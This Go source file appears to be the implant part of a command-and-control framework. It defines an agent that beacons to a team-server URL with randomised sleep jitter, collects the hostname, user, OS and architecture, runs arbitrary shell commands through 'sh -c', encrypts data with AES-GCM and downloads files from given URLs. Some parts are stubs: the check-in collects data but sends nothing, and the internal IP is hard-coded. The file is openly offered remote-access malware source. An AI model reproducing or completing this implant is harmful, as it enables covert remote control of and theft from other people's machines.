package implant

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"math/big"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
)

type Implant struct {
	config    *ImplantConfig
	running   bool
	sessionID string
}

type ImplantConfig struct {
	ServerURL  string
	Sleep      int
	Jitter     float64
	Profile    string
	Encryption string
}

func NewImplant(cfg *ImplantConfig) *Implant {
	if cfg == nil {
		cfg = &ImplantConfig{
			ServerURL:  "https://teamserver.example.com",
			Sleep:      30,
			Jitter:     0.25,
			Profile:    "default",
			Encryption: "aes-256-gcm",
		}
	}
	return &Implant{config: cfg}
}

func (i *Implant) Run() {
	i.running = true
	i.sessionID = i.generateSessionID()

	for i.running {
		n, _ := rand.Int(rand.Reader, big.NewInt(100))
		jitterMs := float64(n.Int64()) / 100.0 * i.config.Jitter * float64(time.Second)
		time.Sleep(time.Duration(i.config.Sleep)*time.Second + time.Duration(jitterMs))
		i.checkIn()
	}
}

func (i *Implant) checkIn() {
	data := map[string]string{
		"session_id":  i.sessionID,
		"hostname":    i.getHostname(),
		"internal_ip": i.getInternalIP(),
		"user":        i.getCurrentUser(),
		"os":          runtime.GOOS,
		"arch":        runtime.GOARCH,
	}
	_ = data
}

func (i *Implant) executeCommand(cmd string) (string, error) {
	out, err := exec.Command("sh", "-c", cmd).Output()
	if err != nil {
		return "", err
	}
	return string(out), nil
}

func (i *Implant) Stop() {
	i.running = false
}

func (i *Implant) generateSessionID() string {
	b := make([]byte, 16)
	rand.Read(b)
	return base64.URLEncoding.EncodeToString(b)
}

func (i *Implant) getHostname() string {
	hostname, _ := os.Hostname()
	return hostname
}

func (i *Implant) getInternalIP() string {
	return "127.0.0.1"
}

func (i *Implant) getCurrentUser() string {
	return os.Getenv("USER")
}

func (i *Implant) encrypt(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, data, nil), nil
}

func (i *Implant) decrypt(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

func (i *Implant) downloadFile(url string, dest string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	out, err := os.Create(dest)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}
